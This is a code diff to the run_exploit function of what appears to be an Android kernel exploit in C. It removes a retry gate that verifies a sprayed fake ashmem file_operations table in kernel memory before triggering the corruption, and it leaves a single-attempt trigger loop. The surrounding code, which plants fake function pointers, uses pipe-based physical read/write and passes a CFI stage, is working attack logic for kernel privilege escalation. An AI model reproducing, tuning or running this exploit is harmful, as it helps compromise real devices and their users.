@@ -683,102 +683,6 @@ int run_exploit(int argc, char **argv) {
   }
 #else
   start_p0_ref_keeper();
-#if defined(APP_FOPS_PREFLIP_GATE) && APP_FOPS_PREFLIP_GATE
-  /* Pre-flip gate (forensic S6 §2): the flip aims true but the source page
-   * is sometimes blind spray with zero readback. Verify the planted table
-   * is really resident BEFORE flipping: read back the ioctl slot through a
-   * genuine pre-flip ashmem fd (f_op untouched, name-blob path safe) and
-   * require text_addr(ASHMEM_IOCTL) as planted by put_fake_fops_table
-   * (util.c:936). The llseek slot is deliberately NOT gated: the spray
-   * plants fake_w0+0x18 there (util.c:930-931) while repair_fake_fops_llseek
-   * (fops.c:269) rewrites it to NOOP_LLSEEK post-flip, so only the ioctl
-   * slot is stable across re-prepares. Gate miss -> fresh prepare (mirrors
-   * the fresh-session loop above, no pipe reset: pipebuf_page_base must
-   * survive for the bank entries and the later pipe physrw), max 5;
-   * 5 misses -> clean return with no flip (pr_warning, NOT pr_error:
-   * pr_error exits immediately and would skip cleanup). */
-  {
-    int gate_hit = 0;
-    int gate_triggered = 0;
-    int gate_verified = 0;
-    for (int gate_attempt = 1; gate_attempt <= 5; gate_attempt++) {
-      if (gate_attempt != 1) {
-        page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
-        if (!page_base) {
-          pr_warning("pre-flip gate page unavailable attempt=%d/5\n",
-                     gate_attempt);
-          continue;
-        }
-      }
-      /* Gate v2: whole-table read (same span as the fops.c:40 audit:
-       * FOPS_SHOW_FDINFO_OFF + 8 = 0xe8 = 232 bytes = 29 qwords).
-       * Single-slot +0x50 reads returned 0 bytes pre-trigger (120/120
-       * EOF); testing whether the blob window/pos differs for
-       * full-span reads. Compare in memory at [FOPS_IOCTL_OFF/8]. */
-      enum { gate_span = FOPS_SHOW_FDINFO_OFF + sizeof(uint64_t) };
-      uint64_t gate_table[gate_span / sizeof(uint64_t)];
-      uint64_t gate_want = text_addr(ASHMEM_IOCTL);
-      ssize_t gate_rd = -1;
-      memset(gate_table, 0, sizeof(gate_table));
-      int gate_fd = open_ashmem_device();
-      if (gate_fd >= 0) {
-        int gate_errno = 0;
-        gate_rd = configfs_read_once(gate_fd, fake_fops,
-                                     gate_table, sizeof(gate_table));
-        gate_errno = errno;
-        SYSCHK(close(gate_fd));
-        if (gate_rd != (ssize_t)sizeof(gate_table)) {
-          pr_warning("pre-flip gate read failed attempt=%d/5 ret=%zd "
-                     "want=%zu errno=%d\n",
-                     gate_attempt, gate_rd, sizeof(gate_table),
-                     gate_errno);
-        }
-      } else {
-        pr_warning("pre-flip gate open failed attempt=%d/5 errno=%d\n",
-                   gate_attempt, errno);
-      }
-      uint64_t gate_read = 0;
-      if (gate_rd == (ssize_t)sizeof(gate_table)) {
-        gate_read = gate_table[FOPS_IOCTL_OFF / sizeof(uint64_t)];
-      }
-      if (gate_rd != (ssize_t)sizeof(gate_table) ||
-          gate_read != gate_want) {
-        pr_warning("pre-flip gate miss attempt=%d/5 ret=%zd "
-                   "read=%016llx want=%016llx\n",
-                   gate_attempt, gate_rd,
-                   (unsigned long long)gate_read,
-                   (unsigned long long)gate_want);
-        continue;
-      }
-      gate_hit = 1;
-      gate_triggered = app_trigger_fops_slide_route();
-#if !defined(APP_S928_STABLE_RACE) || !APP_S928_STABLE_RACE
-      pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
-              gate_attempt, gate_triggered);
-#endif
-      gate_verified = gate_triggered && try_cfi_stage();
-      pr_info("app fops slide attempt=%d/5 triggered=%d verified=%d "
-              "step=%d errno=%d\n",
-              gate_attempt, gate_triggered, gate_verified,
-              cfi_last_step, cfi_last_errno);
-      if (gate_verified || cfi_dirty_seen) {
-        break;
-      }
-      pr_info("app fops clean miss after gate hit; releasing reclaim "
-              "state before fresh page attempt=%d/5\n",
-              gate_attempt);
-    }
-    if (!gate_hit) {
-      pr_warning("pre-flip gate never hit in 5 attempts; production "
-                 "skipped, no flip performed\n");
-      if (pipe_prepare_child > 0) {
-        SYSCHK(kill(pipe_prepare_child, SIGKILL));
-        SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
-      }
-      return 1;
-    }
-  }
-#else
   for (int attempt = 1; attempt <= 1; attempt++) {
     int triggered = app_trigger_fops_slide_route();
 #if !defined(APP_S928_STABLE_RACE) || !APP_S928_STABLE_RACE
@@ -793,7 +697,6 @@ int run_exploit(int argc, char **argv) {
       break;
     }
   }
-#endif
 #endif
 #endif
 #else
